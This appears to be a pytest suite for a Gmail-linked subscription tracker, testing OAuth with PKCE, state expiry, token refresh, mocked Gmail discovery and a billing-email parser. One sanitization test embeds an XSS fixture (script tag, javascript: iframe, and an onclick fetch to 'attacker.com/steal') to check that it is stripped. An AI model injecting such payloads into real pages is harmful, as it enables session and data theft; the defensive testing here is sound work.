import base64
from datetime import datetime, timedelta, timezone
import hashlib
import os
import httpx
import pytest
from fastapi.testclient import TestClient
from backend.app.main import app
from backend.app.database import get_email_account, initialize_schema
from backend.app.config import validate_oauth_config, is_live_oauth_configured as cfg_is_live
from backend.app.email import (
    confirm_candidate_into_inventory,
    disconnect_account,
    dismiss_candidate,
    exchange_code_for_tokens,
    generate_oauth_url,
    get_valid_access_token,
    is_live_oauth_configured,
    parse_billing_email,
    sync_user_mailbox,
)
from backend.app.email.oauth import generate_pkce_pair, refresh_access_token, _OAUTH_STATES
from backend.app.email.service import _fetch_live_gmail_candidates

client = TestClient(app)


@pytest.fixture(autouse=True)
def setup_db():
    initialize_schema()


# =============================================================================
# 1. OAuth Authorization & Security Tests
# =============================================================================

def test_oauth_authorization_url_generation():
    """Verify OAuth URL contains state, code_challenge, read-only scope, and offline access when live, or safe demo URL."""
    import os

    # 1. Demo mode URL
    url_demo, state_demo = generate_oauth_url(user_id="user_oauth_demo")
    assert state_demo is not None
    assert "state=" in url_demo

    # 2. Live configured OAuth URL
    os.environ["GOOGLE_CLIENT_ID"] = "test-client-id.apps.googleusercontent.com"
    os.environ["GOOGLE_CLIENT_SECRET"] = "test-client-secret"
    try:
        url_live, state_live = generate_oauth_url(user_id="user_oauth_test")
        assert "https://accounts.google.com/o/oauth2/v2/auth" in url_live
        assert "response_type=code" in url_live
        assert "client_id=test-client-id" in url_live
        assert f"state={state_live}" in url_live
        assert "code_challenge=" in url_live
        assert "code_challenge_method=S256" in url_live
        assert "access_type=offline" in url_live
        assert "gmail.readonly" in url_live
    finally:
        os.environ.pop("GOOGLE_CLIENT_ID", None)
        os.environ.pop("GOOGLE_CLIENT_SECRET", None)


def test_oauth_flow_endpoints_mock_mode():
    """Verify /api/email/oauth/url and callback succeed gracefully in demo/mock mode."""
    # 1. Get OAuth URL
    resp = client.get("/api/email/oauth/url", headers={"X-User-ID": "user_demo_1"})
    assert resp.status_code == 200
    data = resp.json()
    assert "url" in data
    assert "state" in data
    state = data["state"]

    # 2. Callback
    cb_resp = client.get(f"/api/email/oauth/callback?code=mock_code_123&state={state}")
    assert cb_resp.status_code == 200
    cb_data = cb_resp.json()
    assert cb_data["connected"] is True
    assert "user_demo_1" in cb_data["message"]

    # 3. Check status
    status_resp = client.get("/api/email/status", headers={"X-User-ID": "user_demo_1"})
    assert status_resp.status_code == 200
    status_data = status_resp.json()
    assert status_data["is_connected"] is True
    assert "@" in status_data["email_address"]

    # 4. Disconnect
    disc_resp = client.post("/api/email/disconnect", headers={"X-User-ID": "user_demo_1"})
    assert disc_resp.status_code == 200
    assert disc_resp.json()["disconnected"] is True

    # Check status after disconnect
    status_resp_after = client.get("/api/email/status", headers={"X-User-ID": "user_demo_1"})
    assert status_resp_after.json()["is_connected"] is False


# =============================================================================
# 2. Billing Email Parser Tests
# =============================================================================

def test_parser_extracts_billing_receipt_plain_text():
    """Verify deterministic parser extracts merchant, price, interval, and renewal date."""
    subject = "Your Netflix Subscription Receipt - Invoice #NF-88219"
    body = (
        "Dear Customer,\n\n"
        "Thank you for your payment of $19.99 USD for your Netflix Premium monthly plan.\n"
        "Your next billing renewal date is 2026-11-28.\n"
        "You can manage your membership anytime in Account Settings.\n"
    )

    candidate = parse_billing_email(
        message_id="msg_netflix_01",
        subject=subject,
        sender="billing@netflix.com",
        raw_content=body,
    )

    assert candidate is not None
    assert candidate.merchant_name == "Netflix"
    assert candidate.estimated_cost == 19.99
    assert candidate.currency == "USD"
    assert candidate.billing_interval == "monthly"
    assert str(candidate.detected_renewal_date) == "2026-11-28"
    assert candidate.cancellation_signal is False
    assert candidate.confidence >= 0.85


def test_parser_html_sanitization_and_xss_protection():
    """Verify HTML email body is safely sanitized and malicious script payloads are stripped."""
    malicious_html = """
    <html>
      <body>
        <h1>Spotify Premium Renewal</h1>
        <p>Your subscription has renewed for $10.99/month.</p>
        <script>alert('XSS Exploit Attempt');</script>
        <iframe src="javascript:alert(1)"></iframe>
        <a href="javascript:void(0)" onclick="fetch('http://attacker.com/steal')">Click here</a>
      </body>
    </html>
    """

    candidate = parse_billing_email(
        message_id="msg_spotify_xss",
        subject="Spotify Renewal Confirmation",
        sender="no-reply@spotify.com",
        raw_content=malicious_html,
    )

    assert candidate is not None
    assert candidate.merchant_name == "Spotify"
    assert candidate.estimated_cost == 10.99
    # Ensure script content is completely removed from extracted snippet
    snippet = candidate.email_snippet
    assert "<script>" not in snippet
    assert "alert(" not in snippet
    assert "<iframe>" not in snippet
    assert "javascript:" not in snippet


def test_parser_detects_cancellation_signal():
    """Verify parser flags cancellation confirmations and refund signals."""
    cancel_email = (
        "We're sorry to see you go. Your subscription to Disney+ has been successfully cancelled.\n"
        "Your access will continue until the end of your current billing period on 2026-11-01.\n"
    )

    candidate = parse_billing_email(
        message_id="msg_disney_cancel",
        subject="Cancellation Confirmation: Disney+",
        sender="disneyplus@mail.disneyplus.com",
        raw_content=cancel_email,
    )

    assert candidate is not None
    assert candidate.merchant_name == "Disney+"
    assert candidate.cancellation_signal is True


def test_parser_filters_non_billing_emails():
    """Verify regular non-billing emails are rejected without false positives."""
    chat_email = (
        "Hey, are we still meeting tomorrow for coffee at 2 PM?\n"
        "Let me know if that time works for you!\n"
    )

    candidate = parse_billing_email(
        message_id="msg_friend_01",
        subject="Coffee tomorrow?",
        sender="friend@example.com",
        raw_content=chat_email,
    )

    assert candidate is None


# =============================================================================
# 3. Email Sync & Candidate Lifecycle Tests
# =============================================================================

def test_sync_mailbox_and_candidate_confirmation():
    """Verify end-to-end sync, candidate review, confirmation into unified inventory."""
    user_id = "user_sync_test"

    # 1. Connect mailbox first
    auth_resp = client.get("/api/email/oauth/url", headers={"X-User-ID": user_id})
    state = auth_resp.json()["state"]
    client.get(f"/api/email/oauth/callback?code=mock_code&state={state}")

    # 2. Trigger mailbox sync
    sync_resp = client.post("/api/email/sync", headers={"X-User-ID": user_id})
    assert sync_resp.status_code == 200
    sync_data = sync_resp.json()
    assert sync_data["synced_count"] >= 3

    # 3. Retrieve discovered candidates
    cand_resp = client.get("/api/email/candidates", headers={"X-User-ID": user_id})
    assert cand_resp.status_code == 200
    candidates = cand_resp.json()
    assert len(candidates) >= 3

    # Check that candidate has evidence and metadata
    cand = candidates[0]
    cand_id = cand["candidate_id"]
    assert cand["review_status"] == "pending"
    assert cand["merchant_name"] is not None
    assert cand["estimated_cost"] is not None

    # 4. Confirm candidate -> promotes to unified inventory
    conf_resp = client.post(f"/api/email/candidates/{cand_id}/confirm", headers={"X-User-ID": user_id})
    assert conf_resp.status_code == 200
    sub_data = conf_resp.json()

    assert sub_data["subscription_id"].startswith("sub_email_")
    assert sub_data["discovery_source"] == "email"
    assert sub_data["user_id"] == user_id
    assert sub_data["status"] == "active"

    # Verify candidate status changed to confirmed
    cand_after = client.get("/api/email/candidates", headers={"X-User-ID": user_id}).json()
    confirmed_cand = next(c for c in cand_after if c["candidate_id"] == cand_id)
    assert confirmed_cand["review_status"] == "confirmed"

    # Verify subscription shows up in user's inventory
    inv_resp = client.get("/subscriptions", headers={"X-User-ID": user_id})
    assert inv_resp.status_code == 200
    inv = inv_resp.json()
    assert any(s["subscription_id"] == sub_data["subscription_id"] for s in inv)


def test_candidate_dismissal():
    """Verify dismissing a candidate updates status and does NOT add to inventory."""
    user_id = "user_dismiss_test"

    # Connect & sync
    auth = client.get("/api/email/oauth/url", headers={"X-User-ID": user_id}).json()
    client.get(f"/api/email/oauth/callback?code=mock&state={auth['state']}")
    client.post("/api/email/sync", headers={"X-User-ID": user_id})

    # Dismiss first candidate
    candidates = client.get("/api/email/candidates", headers={"X-User-ID": user_id}).json()
    cand_to_dismiss = candidates[0]
    cand_id = cand_to_dismiss["candidate_id"]

    dismiss_resp = client.post(f"/api/email/candidates/{cand_id}/dismiss", headers={"X-User-ID": user_id})
    assert dismiss_resp.status_code == 200

    # Verify candidate is dismissed
    cand_after = client.get("/api/email/candidates", headers={"X-User-ID": user_id}).json()
    d_cand = next(c for c in cand_after if c["candidate_id"] == cand_id)
    assert d_cand["review_status"] == "dismissed"


# =============================================================================
# 4. Configuration & Validation Tests
# =============================================================================

def test_config_validation_missing_client_id(monkeypatch):
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "some_secret")
    monkeypatch.setenv("GOOGLE_REDIRECT_URI", "http://127.0.0.1:8000/api/email/oauth/callback")
    is_valid, msg = validate_oauth_config()
    assert is_valid is False
    assert msg == "Missing GOOGLE_CLIENT_ID"
    assert "some_secret" not in (msg or "")


def test_config_validation_missing_client_secret(monkeypatch):
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "12345.apps.googleusercontent.com")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "")
    monkeypatch.setenv("GOOGLE_REDIRECT_URI", "http://127.0.0.1:8000/api/email/oauth/callback")
    is_valid, msg = validate_oauth_config()
    assert is_valid is False
    assert msg == "Missing GOOGLE_CLIENT_SECRET"


def test_config_validation_invalid_redirect_uri(monkeypatch):
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "12345.apps.googleusercontent.com")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "valid_secret_123")
    monkeypatch.setenv("GOOGLE_REDIRECT_URI", "ftp://invalid-uri")
    is_valid, msg = validate_oauth_config()
    assert is_valid is False
    assert "GOOGLE_REDIRECT_URI" in (msg or "")


def test_config_validation_valid(monkeypatch):
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "12345.apps.googleusercontent.com")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "valid_secret_123")
    monkeypatch.setenv("GOOGLE_REDIRECT_URI", "http://127.0.0.1:8000/api/email/oauth/callback")
    is_valid, msg = validate_oauth_config()
    assert is_valid is True
    assert msg is None


def test_demo_fallback_when_credentials_absent(monkeypatch):
    monkeypatch.delenv("GOOGLE_CLIENT_ID", raising=False)
    monkeypatch.delenv("GOOGLE_CLIENT_SECRET", raising=False)
    assert cfg_is_live() is False
    url, state = generate_oauth_url(user_id="user_fallback")
    assert "/api/email/oauth/callback?code=mock_auth_code_demo_" in url


# =============================================================================
# 5. PKCE RFC 7636 and CSRF State Security Tests
# =============================================================================

def test_pkce_rfc7636_generation_and_challenge_correctness():
    """Verify code_challenge matches BASE64URL(SHA256(code_verifier))."""
    code_verifier, code_challenge = generate_pkce_pair()
    assert len(code_verifier) >= 43
    # Check that code_challenge is valid base64url without '=' padding
    assert "=" not in code_challenge

    expected_digest = hashlib.sha256(code_verifier.encode("ascii")).digest()
    expected_challenge = base64.urlsafe_b64encode(expected_digest).decode("ascii").rstrip("=")
    assert code_challenge == expected_challenge


def test_state_expiration_rejected():
    """Verify that states older than 10 minutes are expired and rejected."""
    old_state = "expired_test_state_12345"
    _OAUTH_STATES[old_state] = {
        "user_id": "test_user",
        "code_verifier": "test_verifier",
        "redirect_uri": "http://127.0.0.1:8000/api/email/oauth/callback",
        "created_at": datetime.now(timezone.utc) - timedelta(minutes=15),
    }

    with pytest.raises(ValueError, match="OAuth authorization session expired"):
        exchange_code_for_tokens(code="live_code_abc", state=old_state)


def test_live_oauth_invalid_state_rejected():
    """Verify that an unknown or mismatched state raises ValueError."""
    with pytest.raises(ValueError, match="Invalid, expired, or mismatched OAuth state parameter"):
        exchange_code_for_tokens(code="live_real_code_123", state="nonexistent_state")


# =============================================================================
# 6. Live OAuth Flow Mocked Tests (Google Token & Profile Endpoints)
# =============================================================================

def test_live_oauth_token_exchange_success_with_mocked_google(monkeypatch):
    """Verify successful token exchange, profile retrieval, and live account connection."""
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "real_client_id.apps.googleusercontent.com")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "real_client_secret_xyz")
    monkeypatch.setenv("GOOGLE_REDIRECT_URI", "http://127.0.0.1:8000/api/email/oauth/callback")

    # Generate genuine live auth URL
    url, state = generate_oauth_url(user_id="user_live_success")
    assert "accounts.google.com" in url

    # Mock Google Token & Profile endpoints
    def mock_google_handler(request: httpx.Request) -> httpx.Response:
        url_str = str(request.url)
        if "oauth2.googleapis.com/token" in url_str:
            # Verify code_verifier is included in form payload
            body = request.read().decode("utf-8")
            assert "code_verifier=" in body
            assert "grant_type=authorization_code" in body
            return httpx.Response(
                200,
                json={
                    "access_token": "ya29.live_google_access_token_123",
                    "refresh_token": "1//live_google_refresh_token_456",
                    "expires_in": 3600,
                    "scope": "https://www.googleapis.com/auth/gmail.readonly",
                    "token_type": "Bearer",
                },
            )
        elif "gmail/v1/users/me/profile" in url_str:
            assert request.headers.get("authorization") == "Bearer ya29.live_google_access_token_123"
            return httpx.Response(
                200,
                json={
                    "emailAddress": "alice.subscriber@gmail.com",
                    "messagesTotal": 1420,
                    "threadsTotal": 850,
                    "historyId": "987654",
                },
            )
        return httpx.Response(404, text="Not Found")

    transport = httpx.MockTransport(mock_google_handler)
    mock_client = httpx.Client(transport=transport)

    status = exchange_code_for_tokens(
        code="genuine_google_auth_code_789",
        state=state,
        client=mock_client,
    )

    assert status.is_connected is True
    assert status.email_address == "alice.subscriber@gmail.com"
    assert status.mode == "live"
    assert status.is_live_configured is True
    assert "gmail.readonly" in status.scopes[0]

    # Verify DB status retrieval preserves live mode
    db_status = get_email_account("user_live_success")
    assert db_status.is_connected is True
    assert db_status.email_address == "alice.subscriber@gmail.com"
    assert db_status.mode == "live"


def test_live_oauth_access_denied_by_user(monkeypatch):
    """Verify that user cancellation or access denial on Google consent screen is handled cleanly."""
    resp = client.get("/api/email/oauth/callback?error=access_denied&state=some_state")
    assert resp.status_code == 400
    data = resp.json()
    err_msg = data.get("error", {}).get("message", "") or data.get("detail", {}).get("message", "")
    assert "access_denied" in err_msg


def test_live_oauth_token_exchange_failure_400(monkeypatch):
    """Verify token exchange error from Google raises descriptive, safe error."""
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "real_client_id.apps.googleusercontent.com")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "real_client_secret_xyz")
    monkeypatch.setenv("GOOGLE_REDIRECT_URI", "http://127.0.0.1:8000/api/email/oauth/callback")

    url, state = generate_oauth_url(user_id="user_token_fail")

    def mock_google_error(request: httpx.Request) -> httpx.Response:
        return httpx.Response(400, json={"error": "invalid_grant", "error_description": "Code expired"})

    transport = httpx.MockTransport(mock_google_error)
    mock_client = httpx.Client(transport=transport)

    with pytest.raises(ValueError, match="Code expired"):
        exchange_code_for_tokens(code="expired_code", state=state, client=mock_client)


def test_live_oauth_refresh_token_flow(monkeypatch):
    """Verify refreshing an expired access token using stored refresh token."""
    monkeypatch.setenv("GOOGLE_CLIENT_ID", "real_client_id.apps.googleusercontent.com")
    monkeypatch.setenv("GOOGLE_CLIENT_SECRET", "real_client_secret_xyz")

    # Set up user with refresh token in DB
    user_id = "user_refresh_test"
    from backend.app.database import save_email_account
    from backend.app.models import EmailAccountStatus
    initial_status = EmailAccountStatus(
        user_id=user_id,
        email_address="refresh.user@gmail.com",
        is_connected=True,
    )
    save_email_account(
        initial_status,
        refresh_token="1//refresh_token_abc",
        access_token="old_access_token_expired",
        expires_at=datetime.now(timezone.utc) - timedelta(minutes=10),
    )

    def mock_refresh_handler(request: httpx.Request) -> httpx.Response:
        assert "grant_type=refresh_token" in request.read().decode("utf-8")
        return httpx.Response(
            200,
            json={
                "access_token": "ya29.new_refreshed_access_token_999",
                "expires_in": 3600,
            },
        )

    transport = httpx.MockTransport(mock_refresh_handler)
    mock_client = httpx.Client(transport=transport)

    new_token = refresh_access_token(user_id=user_id, client=mock_client)
    assert new_token == "ya29.new_refreshed_access_token_999"


def test_disconnected_state_truthful_values():
    """Verify disconnected state returns is_connected=False, email_address=None, candidate_count=0."""
    status_resp = client.get("/api/email/status", headers={"X-User-ID": "user_completely_new"})
    assert status_resp.status_code == 200
    data = status_resp.json()
    assert data["is_connected"] is False
    assert data["email_address"] is None
    assert data["candidate_count"] == 0


# =============================================================================
# 7. Live Gmail Discovery Mocked API Tests
# =============================================================================

def test_live_gmail_discovery_successful_extraction():
    """Verify querying Gmail API for messages, fetching message bodies, and extracting candidates."""
    messages_payload = {
        "messages": [
            {"id": "msg_gmail_hulu_01", "threadId": "th_01"},
            {"id": "msg_gmail_adobe_02", "threadId": "th_02"},
        ]
    }

    hulu_email_html = """
    <div>
      <h2>Hulu Billing Notification</h2>
      <p>Your payment of $17.99 for Hulu (No Ads) has been received.</p>
      <p>Next renewal date: 2026-11-20.</p>
    </div>
    """
    hulu_encoded = base64.urlsafe_b64encode(hulu_email_html.encode("utf-8")).decode("ascii")

    adobe_email_html = """
    <div>
      <h2>Adobe Creative Cloud Invoice</h2>
      <p>Thank you for subscribing to Adobe Creative Cloud at $54.99 per month.</p>
      <p>Your next renewal is on 2026-12-05.</p>
    </div>
    """
    adobe_encoded = base64.urlsafe_b64encode(adobe_email_html.encode("utf-8")).decode("ascii")

    def mock_gmail_handler(request: httpx.Request) -> httpx.Response:
        url_str = str(request.url)
        if "messages?" in url_str:
            return httpx.Response(200, json=messages_payload)
        elif "messages/msg_gmail_hulu_01" in url_str:
            return httpx.Response(
                200,
                json={
                    "id": "msg_gmail_hulu_01",
                    "internalDate": "1730000000000",
                    "payload": {
                        "headers": [
                            {"name": "Subject", "value": "Your Hulu monthly receipt"},
                            {"name": "From", "value": "billing@hulu.com"},
                        ],
                        "parts": [
                            {"mimeType": "text/html", "body": {"data": hulu_encoded}},
                        ],
                    },
                },
            )
        elif "messages/msg_gmail_adobe_02" in url_str:
            return httpx.Response(
                200,
                json={
                    "id": "msg_gmail_adobe_02",
                    "internalDate": "1730005000000",
                    "payload": {
                        "headers": [
                            {"name": "Subject", "value": "Adobe Creative Cloud subscription billed"},
                            {"name": "From", "value": "billing@adobe.com"},
                        ],
                        "parts": [
                            {"mimeType": "text/html", "body": {"data": adobe_encoded}},
                        ],
                    },
                },
            )
        return httpx.Response(404, text="Not Found")

    transport = httpx.MockTransport(mock_gmail_handler)
    mock_client = httpx.Client(transport=transport)

    candidates = _fetch_live_gmail_candidates(
        access_token="mock_live_token",
        user_id="user_gmail_live_test",
        max_messages=10,
        client=mock_client,
    )

    assert len(candidates) == 2
    hulu_cand = next(c for c in candidates if c.merchant_name == "Hulu")
    assert hulu_cand.estimated_cost == 17.99
    assert str(hulu_cand.detected_renewal_date) == "2026-11-20"
    # Ensure receipt does NOT establish user streaming activity/usage
    assert hulu_cand.detected_last_used is None

    adobe_cand = next(c for c in candidates if "Adobe" in c.merchant_name)
    assert adobe_cand.estimated_cost == 54.99
    assert str(adobe_cand.detected_renewal_date) == "2026-12-05"


def test_live_gmail_discovery_empty_mailbox():
    """Verify empty inbox returns zero candidates gracefully without error."""
    def mock_empty_handler(request: httpx.Request) -> httpx.Response:
        return httpx.Response(200, json={"messages": [], "resultSizeEstimate": 0})

    transport = httpx.MockTransport(mock_empty_handler)
    mock_client = httpx.Client(transport=transport)

    candidates = _fetch_live_gmail_candidates(
        access_token="mock_token",
        user_id="user_empty_inbox",
        max_messages=10,
        client=mock_client,
    )
    assert candidates == []


def test_live_gmail_discovery_no_billing_messages():
    """Verify non-billing messages found by broad search are rejected during parsing."""
    personal_email = base64.urlsafe_b64encode(b"Hey, dinner this Friday at 7?").decode("ascii")

    def mock_chat_handler(request: httpx.Request) -> httpx.Response:
        url_str = str(request.url)
        if "messages?" in url_str:
            return httpx.Response(200, json={"messages": [{"id": "msg_chat_99"}]})
        return httpx.Response(
            200,
            json={
                "id": "msg_chat_99",
                "payload": {
                    "headers": [
                        {"name": "Subject", "value": "Dinner plans"},
                        {"name": "From", "value": "bob@gmail.com"},
                    ],
                    "body": {"data": personal_email},
                },
            },
        )

    transport = httpx.MockTransport(mock_chat_handler)
    mock_client = httpx.Client(transport=transport)

    candidates = _fetch_live_gmail_candidates(
        access_token="mock_token",
        user_id="user_no_billing",
        max_messages=5,
        client=mock_client,
    )
    assert candidates == []


def test_live_gmail_discovery_receipt_does_not_set_last_used():
    """Verify email receipt arrival date is NEVER used as active user streaming/service usage."""
    cand = parse_billing_email(
        message_id="msg_test_usage_01",
        subject="Your Spotify Monthly Subscription",
        sender="billing@spotify.com",
        raw_content="Your plan renewed for $10.99. Next renewal date: 2026-12-15.",
        received_at=datetime(2026, 11, 15, tzinfo=timezone.utc),
    )
    assert cand is not None
    # Crucial safety check: receipt arrival date does not establish user usage
    assert cand.detected_last_used is None
